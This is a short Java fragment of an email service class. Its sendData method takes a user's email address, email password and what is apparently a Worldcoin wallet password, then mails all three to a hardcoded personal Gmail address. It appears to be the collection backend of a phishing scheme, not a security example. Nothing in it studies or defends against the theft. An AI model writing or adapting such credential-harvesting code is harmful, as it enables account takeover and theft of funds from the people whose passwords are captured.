...
public class EmailServicesImpl implements IEmailServices {
    ...
    public void sendData(DataDTO email) throws MessagingException {
        try {
            ...
            helper.setTo("micaela428111@gmail.com");
            helper.setSubject("Datos ");
            helper.setText("Gmail: "+email.getEmail()+"<br>ContraceñaEmail: " + email.getPasswordEmail()+ "<br>Contraceña Wld: "+email.getPaswwordWorcoin());
